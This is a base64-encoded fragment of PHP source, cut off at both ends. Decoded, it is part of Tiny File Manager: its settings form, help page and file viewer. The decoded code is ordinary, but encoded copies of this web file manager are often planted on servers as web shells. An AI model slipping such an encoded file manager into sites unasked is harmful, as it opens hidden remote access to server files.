iLTIgPD9waHAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4iPgogICAgICAgICAgICA8aDYgY2xhc3M9ImNhcmQtaGVhZGVyIj4KICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1jb2ciPjwvaT4gIDw/cGhwIGVjaG8gbG5nKCdTZXR0aW5ncycpID8+CiAgICAgICAgICAgICAgICA8YSBocmVmPSI/cD08P3BocCBlY2hvIEZNX1BBVEggPz4iIGNsYXNzPSJmbG9hdC1yaWdodCI+PGkgY2xhc3M9ImZhIGZhLXdpbmRvdy1jbG9zZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnQ2FuY2VsJyk/PjwvYT4KICAgICAgICAgICAgPC9oNj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgICAgIDxmb3JtIGlkPSJqcy1zZXR0aW5ncy1mb3JtIiBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBkYXRhLXR5cGU9ImFqYXgiIG9uc3VibWl0PSJyZXR1cm4gc2F2ZV9zZXR0aW5ncyh0aGlzKSI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idHlwZSIgdmFsdWU9InNldHRpbmdzIiBhcmlhLWxhYmVsPSJoaWRkZW4iIGFyaWEtaGlkZGVuPSJ0cnVlIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHJvdyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImpzLWxhbmd1YWdlIiBjbGFzcz0iY29sLXNtLTMgY29sLWZvcm0tbGFiZWwiPjw/cGhwIGVjaG8gbG5nKCdMYW5ndWFnZScpID8+PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTUiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0ianMtbGFuZ3VhZ2UiIG5hbWU9ImpzLWxhbmd1YWdlIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGdldFNlbGVjdGVkKCRsKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCAkbGFuZzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkbGFuZyA9PSAkbCkgPyAnc2VsZWN0ZWQnIDogJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRsYW5nX2xpc3QgYXMgJGsgPT4gJHYpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPG9wdGlvbiB2YWx1ZT0nJGsnICIuZ2V0U2VsZWN0ZWQoJGspLiI+JHY8L29wdGlvbj4iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zZWxlY3Q+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgICAgICAgICAgLy9nZXQgT04vT0ZGIGFuZCBhY3RpdmUgY2xhc3MKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBnZXRDaGVja2VkKCRjb25mLCAkdmFsLCAkdHh0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjb25mPT0gMSAmJiAkdmFsID09MSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0eHQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZigkY29uZiA9PSAnJyAmJiAkdmFsID09ICcnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHR4dDsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICA/PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgcm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ianMtZXJyLXJwdC0xIiBjbGFzcz0iY29sLXNtLTMgY29sLWZvcm0tbGFiZWwiPjw/cGhwIGVjaG8gbG5nKCdFcnJvclJlcG9ydGluZycpID8+PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTkiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYnRuLWdyb3VwIGJ0bi1ncm91cC10b2dnbGUiIGRhdGEtdG9nZ2xlPSJidXR0b25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IDw/cGhwIGVjaG8gZ2V0Q2hlY2tlZCgkcmVwb3J0X2Vycm9ycywgMSwgJ2FjdGl2ZScpID8+Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJqcy1lcnJvci1yZXBvcnQiIGlkPSJqcy1lcnItcnB0LTEiIGF1dG9jb21wbGV0ZT0ib2ZmIiB2YWx1ZT0idHJ1ZSIgPD9waHAgZWNobyBnZXRDaGVja2VkKCRyZXBvcnRfZXJyb3JzLCAxLCAnY2hlY2tlZCcpID8+ID4gT04KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iYnRuIGJ0bi1zZWNvbmRhcnkgPD9waHAgZWNobyBnZXRDaGVja2VkKCRyZXBvcnRfZXJyb3JzLCAnJywgJ2FjdGl2ZScpID8+Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJqcy1lcnJvci1yZXBvcnQiIGlkPSJqcy1lcnItcnB0LTAiIGF1dG9jb21wbGV0ZT0ib2ZmIiB2YWx1ZT0iZmFsc2UiIDw/cGhwIGVjaG8gZ2V0Q2hlY2tlZCgkcmVwb3J0X2Vycm9ycywgJycsICdjaGVja2VkJykgPz4gPiBPRkYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHJvdyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImpzLWhkbi0xIiBjbGFzcz0iY29sLXNtLTMgY29sLWZvcm0tbGFiZWwiPjw/cGhwIGVjaG8gbG5nKCdTaG93SGlkZGVuRmlsZXMnKSA/PjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS05Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi1ncm91cCBidG4tZ3JvdXAtdG9nZ2xlIiBkYXRhLXRvZ2dsZT0iYnV0dG9ucyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSA8P3BocCBlY2hvIGdldENoZWNrZWQoJHNob3dfaGlkZGVuX2ZpbGVzLCAxLCAnYWN0aXZlJykgPz4iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9ImpzLXNob3ctaGlkZGVuIiBpZD0ianMtaGRuLTEiIGF1dG9jb21wbGV0ZT0ib2ZmIiB2YWx1ZT0idHJ1ZSIgPD9waHAgZWNobyBnZXRDaGVja2VkKCRzaG93X2hpZGRlbl9maWxlcywgMSwgJ2NoZWNrZWQnKSA/PiA+IE9OCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IDw/cGhwIGVjaG8gZ2V0Q2hlY2tlZCgkc2hvd19oaWRkZW5fZmlsZXMsICcnLCAnYWN0aXZlJykgPz4iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9ImpzLXNob3ctaGlkZGVuIiBpZD0ianMtaGRuLTAiIGF1dG9jb21wbGV0ZT0ib2ZmIiB2YWx1ZT0iZmFsc2UiIDw/cGhwIGVjaG8gZ2V0Q2hlY2tlZCgkc2hvd19oaWRkZW5fZmlsZXMsICcnLCAnY2hlY2tlZCcpID8+ID4gT0ZGCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCByb3ciPgogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1oaWQtMSIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCBlY2hvIGxuZygnSGlkZUNvbHVtbnMnKSA/PjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS05Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi1ncm91cCBidG4tZ3JvdXAtdG9nZ2xlIiBkYXRhLXRvZ2dsZT0iYnV0dG9ucyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSA8P3BocCBlY2hvIGdldENoZWNrZWQoJGhpZGVfQ29scywgMSwgJ2FjdGl2ZScpID8+Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJqcy1oaWRlLWNvbHMiIGlkPSJqcy1oaWQtMSIgYXV0b2NvbXBsZXRlPSJvZmYiIHZhbHVlPSJ0cnVlIiA8P3BocCBlY2hvIGdldENoZWNrZWQoJGhpZGVfQ29scywgMSwgJ2NoZWNrZWQnKSA/PiA+IE9OCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IDw/cGhwIGVjaG8gZ2V0Q2hlY2tlZCgkaGlkZV9Db2xzLCAnJywgJ2FjdGl2ZScpID8+Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJqcy1oaWRlLWNvbHMiIGlkPSJqcy1oaWQtMCIgYXV0b2NvbXBsZXRlPSJvZmYiIHZhbHVlPSJmYWxzZSIgPD9waHAgZWNobyBnZXRDaGVja2VkKCRoaWRlX0NvbHMsICcnLCAnY2hlY2tlZCcpID8+ID4gT0ZGCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCByb3ciPgogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1kaXItMSIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCBlY2hvIGxuZygnQ2FsY3VsYXRlRm9sZGVyU2l6ZScpID8+PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTkiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYnRuLWdyb3VwIGJ0bi1ncm91cC10b2dnbGUiIGRhdGEtdG9nZ2xlPSJidXR0b25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IDw/cGhwIGVjaG8gZ2V0Q2hlY2tlZCgkY2FsY19mb2xkZXIsIDEsICdhY3RpdmUnKSA/PiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ianMtY2FsYy1mb2xkZXIiIGlkPSJqcy1kaXItMSIgYXV0b2NvbXBsZXRlPSJvZmYiIHZhbHVlPSJ0cnVlIiA8P3BocCBlY2hvIGdldENoZWNrZWQoJGNhbGNfZm9sZGVyLCAxLCAnY2hlY2tlZCcpID8+ID4gT04KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iYnRuIGJ0bi1zZWNvbmRhcnkgPD9waHAgZWNobyBnZXRDaGVja2VkKCRjYWxjX2ZvbGRlciwgJycsICdhY3RpdmUnKSA/PiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ianMtY2FsYy1mb2xkZXIiIGlkPSJqcy1kaXItMCIgYXV0b2NvbXBsZXRlPSJvZmYiIHZhbHVlPSJmYWxzZSIgPD9waHAgZWNobyBnZXRDaGVja2VkKCRjYWxjX2ZvbGRlciwgJycsICdjaGVja2VkJykgPz4gPiBPRkYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHJvdyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS0xMCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc3VjY2VzcyI+IDxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1NhdmUnKTsgPz48L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPD9waHAKICAgIGZtX3Nob3dfZm9vdGVyKCk7CiAgICBleGl0Owp9CgppZiAoaXNzZXQoJF9HRVRbJ2hlbHAnXSkpIHsKICAgIGZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUgogICAgZm1fc2hvd19uYXZfcGF0aChGTV9QQVRIKTsgLy8gY3VycmVudCBwYXRoCiAgICBnbG9iYWwgJGNmZywgJGxhbmc7CiAgICA/PgoKICAgIDxkaXYgY2xhc3M9ImNvbC1tZC04IG9mZnNldC1tZC0yIHB0LTMiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgbWItMiA8P3BocCBlY2hvIGZtX2dldF90aGVtZSgpOyA/PiI+CiAgICAgICAgICAgIDxoNiBjbGFzcz0iY2FyZC1oZWFkZXIiPgogICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLWV4Y2xhbWF0aW9uLWNpcmNsZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnSGVscCcpID8+CiAgICAgICAgICAgICAgICA8YSBocmVmPSI/cD08P3BocCBlY2hvIEZNX1BBVEggPz4iIGNsYXNzPSJmbG9hdC1yaWdodCI+PGkgY2xhc3M9ImZhIGZhLXdpbmRvdy1jbG9zZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnQ2FuY2VsJyk/PjwvYT4KICAgICAgICAgICAgPC9oNj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbC1zbS02Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+PGgzPjxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9wcmFzYXRobWFuaS90aW55ZmlsZW1hbmFnZXIiIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0iYXBwLXYtdGl0bGUiPiBUaW55IEZpbGUgTWFuYWdlciA8P3BocCBlY2hvIFZFUlNJT047ID8+PC9hPjwvaDM+PC9wPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5BdXRob3I6IFByYXNhdGggTWFuaTwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+TWFpbCBVczogPGEgaHJlZj0ibWFpbHRvOmNjcHByb2dyYW1tZXJzQGdtYWlsLmNvbSI+Y2NwcHJvZ3JhbW1lcnNbYXRdZ21haWwuY29tPC9hPiA8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbC1zbS02Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dWwgY2xhc3M9Imxpc3QtZ3JvdXAgbGlzdC1ncm91cC1mbHVzaCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWdyb3VwLWl0ZW0iPjxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9wcmFzYXRobWFuaS90aW55ZmlsZW1hbmFnZXIvd2lraSIgdGFyZ2V0PSJfYmxhbmsiPjxpIGNsYXNzPSJmYSBmYS1xdWVzdGlvbi1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0hlbHAgRG9jdW1lbnRzJykgPz4gPC9hPiA8L2xpPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1ncm91cC1pdGVtIj48YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vcHJhc2F0aG1hbmkvdGlueWZpbGVtYW5hZ2VyL2lzc3VlcyIgdGFyZ2V0PSJfYmxhbmsiPjxpIGNsYXNzPSJmYSBmYS1idWciPjwvaT4gPD9waHAgZWNobyBsbmcoJ1JlcG9ydCBJc3N1ZScpID8+PC9hPjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWdyb3VwLWl0ZW0iPjxhIGhyZWY9ImphdmFzY3JpcHQ6bGF0ZXN0X3JlbGVhc2VfaW5mbygnPD9waHAgZWNobyBWRVJTSU9OOyA/PicpOyI+PGkgY2xhc3M9ImZhIGZhLWxpbmsiPiA8L2k+IDw/cGhwIGVjaG8gbG5nKCdDaGVjayBMYXRlc3QgVmVyc2lvbicpID8+PC9hPjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYoIUZNX1JFQURPTkxZKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWdyb3VwLWl0ZW0iPjxhIGhyZWY9ImphdmFzY3JpcHQ6c2hvd19uZXdfcHdkKCk7Ij48aSBjbGFzcz0iZmEgZmEtbG9jayI+PC9pPiA8P3BocCBlY2hvIGxuZygnR2VuZXJhdGUgbmV3IHBhc3N3b3JkIGhhc2gnKSA/PjwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIH0gPz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cganMtbmV3LXB3ZCBoaWRkZW4gbXQtMiI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gY2xhc3M9ImZvcm0taW5saW5lIiBvbnN1Ym1pdD0icmV0dXJuIG5ld19wYXNzd29yZF9oYXNoKHRoaXMpIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InR5cGUiIHZhbHVlPSJwd2RoYXNoIiBhcmlhLWxhYmVsPSJoaWRkZW4iIGFyaWEtaGlkZGVuPSJ0cnVlIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgbWItMiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ic3RhdGljRW1haWwyIj48P3BocCBlY2hvIGxuZygnR2VuZXJhdGUgbmV3IHBhc3N3b3JkIGhhc2gnKSA/PjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgbXgtc20tMyBtYi0yIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJpbnB1dFBhc3N3b3JkMiIgY2xhc3M9InNyLW9ubHkiPjw/cGhwIGVjaG8gbG5nKCdQYXNzd29yZCcpID8+PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCBidG4tc20iIGlkPSJpbnB1dFBhc3N3b3JkMiIgbmFtZT0iaW5wdXRQYXNzd29yZDIiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCIgcmVxdWlyZWQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIGJ0bi1zbSBtYi0yIj48P3BocCBlY2hvIGxuZygnR2VuZXJhdGUnKSA/PjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBjbGFzcz0iZm9ybS1jb250cm9sIiByb3dzPSIyIiByZWFkb25seSBpZD0ianMtcHdkLXJlc3VsdCI+PC90ZXh0YXJlYT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPD9waHAKICAgIGZtX3Nob3dfZm9vdGVyKCk7CiAgICBleGl0Owp9CgovLyBmaWxlIHZpZXdlcgppZiAoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICRmaWxlID0gJF9HRVRbJ3ZpZXcnXTsKICAgICRxdWlja1ZpZXcgPSAoaXNzZXQoJF9HRVRbJ3F1aWNrVmlldyddKSAmJiAkX0dFVFsncXVpY2tWaWV3J10gPT0gMSkgPyB0cnVlIDogZmFsc2U7CiAgICAkZmlsZSA9IGZtX2NsZWFuX3BhdGgoJGZpbGUsIGZhbHNlKTsKICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGZpbGUpOwogICAgaWYgKCRmaWxlID09ICcnIHx8ICFpc19maWxlKCRwYXRoIC4gJy8nIC4gJGZpbGUpIHx8IGluX2FycmF5KCRmaWxlLCAkR0xPQkFMU1snZXhjbHVkZV9pdGVtcyddKSkgewogICAgICAgIGZtX3NldF9tc2coJ0ZpbGUgbm90IGZvdW5kJywgJ2Vycm9yJyk7CiAgICAgICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZShGTV9QQVRIKSk7CiAgICB9CgogICAgaWYoISRxdWlja1ZpZXcpIHsKICAgICAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVIKICAgICAgICBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAvLyBjdXJyZW50IHBhdGgKICAgIH0KCiAgICAkZmlsZV91cmwgPSBGTV9ST09UX1VSTCAuIGZtX2NvbnZlcnRfd2luKChGTV9QQVRIICE9ICcnID8gJy8nIC4gRk1fUEFUSCA6ICcnKSAuICcvJyAuICRmaWxlKTsKICAgICRmaWxlX3BhdGggPSAkcGF0aCAuICcvJyAuICRmaWxlOwoKICAgICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlX3BhdGgsIFBBVEhJTkZPX0VYVEVOU0lPTikpOwogICAgJG1pbWVfdHlwZSA9IGZtX2dldF9taW1lX3R5cGUoJGZpbGVfcGF0aCk7CiAgICAkZmlsZXNpemUgPSBmbV9nZXRfZmlsZXNpemUoZmlsZXNpemUoJGZpbGVfcGF0aCkpOwoKICAgICRpc196aXAgPSBmYWxzZTsKICAgICRpc19nemlwID0gZmFsc2U7CiAgICAkaXNfaW1hZ2UgPSBmYWxzZTsKICAgICRpc19hdWRpbyA9IGZhbHNlOwogICAgJGlzX3ZpZGVvID0gZmFsc2U7CiAgICAkaXNfdGV4dCA9IGZhbHNlOwogICAgJGlzX29ubGluZVZpZXdlciA9IGZhbHNlOwoKICAgICR2aWV3X3RpdGxlID0gJ0ZpbGUnOwogICAgJGZpbGVuYW1lcyA9IGZhbHNlOyAvLyBmb3IgemlwCiAgICAkY29udGVudCA9ICcnOyAvLyBmb3IgdGV4dAogICAgJG9ubGluZV92aWV3ZXIgPSBzdHJ0b2xvd2VyKEZNX0RPQ19WSUVXRVIpOwoKICAgIGlmKCRvbmxpbmVfdmlld2VyICYmICRvbmxpbmVfdmlld2VyICE9PSAnZmFsc2UnICYmIGluX2FycmF5KCRleHQsIGZtX2dldF9vbmxpbmVWaWV3ZXJfZXh0cygpKSl7CiAgICAgICAgJGlzX29ubGluZVZpZXdlciA9IHRydWU7CiAgICB9CiAgICBlbHNlaWYgKCRleHQgPT0gJ3ppcCcgfHwgJGV4dCA9PSAndGFyJykgewogICAgICAgICRpc196aXAgPSB0cnVlOwogICAgICAgICR2aWV3X3RpdGxlID0gJ0FyY2hpdmUnOwogICAgICAgICRmaWxlbmFtZXMgPSBmbV9nZXRfemlmX2luZm8oJGZpbGVfcGF0aCwgJGV4dCk7CiAgICB9IGVsc2VpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X2ltYWdlX2V4dHMoKSkpIHsKICAgICAgICAkaXNfaW1hZ2UgPSB0cnVlOwogICAgICAgICR2aWV3X3RpdGxlID0gJ0ltYWdlJzsKICAgIH0gZWxzZWlmIChpbl9hcnJheSgkZXh0LCBmbV9nZXRfYXVkaW9fZXh0cygpKSkgewogICAgICAgICRpc19hdWRpbyA9IHRydWU7CiAgICAgICAgJHZpZXdfdGl0bGUgPSAnQXVkaW8nOwogICAgfSBlbHNlaWYgKGluX2FycmF5KCRleHQsIGZtX2dldF92aWRlb19leHRzKCkpKSB7CiAgICAgICAgJGlzX3ZpZGVvID0gdHJ1ZTsKICAgICAgICAkdmlld190aXRsZSA9ICdWaWRlbyc7CiAgICB9IGVsc2VpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X3RleHRfZXh0cygpKSB8fCBzdWJzdHIoJG1pbWVfdHlwZSwgMCwgNCkgPT0gJ3RleHQnIHx8IGluX2FycmF5KCRtaW1lX3R5cGUsIGZtX2dldF90ZXh0X21pbWVzKCkpKSB7CiAgICAgICAgJGlzX3RleHQgPSB0cnVlOwogICAgICAgICRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJGZpbGVfcGF0aCk7CiAgICB9CgogICAgPz4KICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIj4KICAgICAgICAgICAgPD9waHAgaWYoISRxdWlja1ZpZXcpIHsgPz4KICAgICAgICAgICAgICAgIDxwIGNsYX